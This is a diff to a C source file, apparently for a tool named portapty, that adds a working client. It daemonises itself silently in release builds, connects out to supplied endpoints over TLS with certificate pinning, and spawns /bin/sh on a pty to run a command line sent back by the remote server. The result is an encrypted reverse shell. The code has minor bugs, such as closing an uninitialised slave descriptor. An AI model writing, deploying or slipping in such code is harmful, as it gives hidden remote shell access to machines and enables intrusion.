@@ -1,49 +1,110 @@
 #include "common.h"
 
+#include <time.h>
+
 int run_client(const char** eps_elems, size_t eps_len, const char* cert_hash_b64) {
-  puts("woo");
-  return 0;
-//  int err;
+#ifdef NDEBUG
+  // Fork to background
+  if (fork())
+    exit(0);
+  setsid();
+#endif
 
-//  int client = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
-//  if (client < 0) {
-//    err = errno;
-//    PORTAPTY_PRINTF_ERR("could not create socket (errno %i)\n", err);
-//    return 1;
-//  }
+  int err = 0;
 
-//  for (int i = 0; i < eps_len; ++i)
-//    if (!connect(client, (struct sockaddr*)&eps_names[i], sizeof(struct sockaddr_in6)))
-//      goto connected;
-//  PORTAPTY_PRINTF_ERR("could not reach server on any ep\n");
-//  return 1;
+  int client = socket(AF_INET6, SOCK_STREAM | SOCK_CLOEXEC, IPPROTO_TCP);
+  // Allow IPv4
+  int v6_only_val = 0;
+  setsockopt(client, IPPROTO_IPV6, IPV6_V6ONLY, &v6_only_val, sizeof(v6_only_val));
 
-//  connected:
-//  mode_switch(client);
-//  send_sys_details(client);
-//  mode_switch(client);
+  for (int i = 0; i < eps_len; i += 2) {
+    // Try to parse socket, and handle the many forms of screwup that arise thereof
+    struct sockaddr_in6 ep;
+    switch(str2sockaddr(&ep, eps_elems[i], eps_elems[i + 1])) {
+      case 0: break;
+      case 1: { PORTAPTY_PRINTF_WARN("could not parse ip %i\n", i / 2); } continue;
+      case 2: { PORTAPTY_PRINTF_WARN("could not parse port %i\n", i / 2); } continue;
+      default: { PORTAPTY_PRINTF_WARN("unknown error for ep %i\n", i / 2); } continue;
+    }
 
-//  char* remote_details = recv_ctrl(client);
+    if (connect(client, (struct sockaddr*)&ep, sizeof(ep))) {
+      err = errno;
+      PORTAPTY_PRINTF_INFO("could not connect to ep %i (errno %i)\n", i / 2, err);
+    }
+    else
+      goto connected;
+  }
+  // If we get here, then nothing connected
+  PORTAPTY_PRINTF_ERR("could not connect to any ep\n");
+  // We can return here because nothing has been allocated
+  return 1;
 
-//  int local_ctrl  = 0;
-//  int remote_ctrl = 0;
+connected: {}
+  mbedtls_entropy_context entropy;
+  init_entropy(&entropy);
 
-//  send_sys_details(client);
+  mbedtls_hmac_drbg_context rng;
+  init_drbg(&rng, &entropy);
 
-//  int master, slave;
-//  char name[PATH_MAX] = {0};
-//  // This is *technically* vulnerable to a buffer overflow by an evil-but-compliant kernel
-//  //
-//  // If your kernel is evil, then this is the least of your worries
-//  if (openpty(&master, &slave, name, NULL, NULL)) {
-//    int err = errno;
-//    PORTAPTY_PRINTF_ERR("could not open pty (errno %i)\n", err);
-//    return 1;
-//  }
+  mbedtls_ssl_config ssl_cfg;
+  mbedtls_ssl_config_init(&ssl_cfg);
 
-//  PORTAPTY_PRINTF_UPGRADED("available on %s\n", name);
+  mbedtls_ssl_context ssl_ctx;
+  mbedtls_ssl_init(&ssl_ctx);
 
-//  // Connect to each ep until one works
-//  puts("WOOO");
-//  return 0;
+  uint8_t buf[256];
+  if ((err = mbedtls_hmac_drbg_random(&rng, buf, 256))) {
+    char err_buf[256];
+    mbedtls_strerror(err, err_buf, 256);
+    PORTAPTY_PRINTF_ERR("rng borked (%s)\n", err_buf);
+    goto cleanup;
+  }
+
+  union handshake_config handshake_cfg;
+  char cmdline[PORTAPTY_CMD_WIDTH];
+  handshake_cfg.client.cmdline_ret = &cmdline;
+
+  if (cert_hash_b64) {
+    uint8_t hash[PORTAPTY_HASH_LEN];
+    if (decode_hash(hash, cert_hash_b64)) {
+      PORTAPTY_PRINTF_ERR("could not decode hash (err %i)\n", err);
+      goto cleanup;
+    }
+    handshake_cfg.client.fingerprint = &hash;
+  }
+  else
+    handshake_cfg.client.fingerprint = NULL;
+
+  if ((err = do_handshake(client, &ssl_ctx, &ssl_cfg, &rng, 0, &handshake_cfg))) {
+    PORTAPTY_PRINTF_ERR("handshake failed (err %i)\n", err);
+    goto cleanup;
+  }
+
+  int master, slave;
+  char name[PATH_MAX];
+
+  // Fork and exec the executable
+  if (!forkpty(&master, name, NULL, NULL)) {
+    // This will not wait for a flush before exiting, and will just sighup!
+    execl("/bin/sh", "/bin/sh", "-c", cmdline, (char*)NULL);
+    // Make a bit of noise if we can't exec sh
+    abort();
+  }
+  close(slave);
+
+  PORTAPTY_PRINTF_INFO("available on %s\n", name);
+
+  portapty_read_loop(&ssl_ctx, client, master);
+
+  close(master);
+
+  PORTAPTY_PRINTF_INFO("done\n");
+
+cleanup:
+  mbedtls_ssl_free(&ssl_ctx);
+  mbedtls_ssl_config_free(&ssl_cfg);
+  mbedtls_hmac_drbg_free(&rng);
+  mbedtls_entropy_free(&entropy);
+
+  return err;
 }
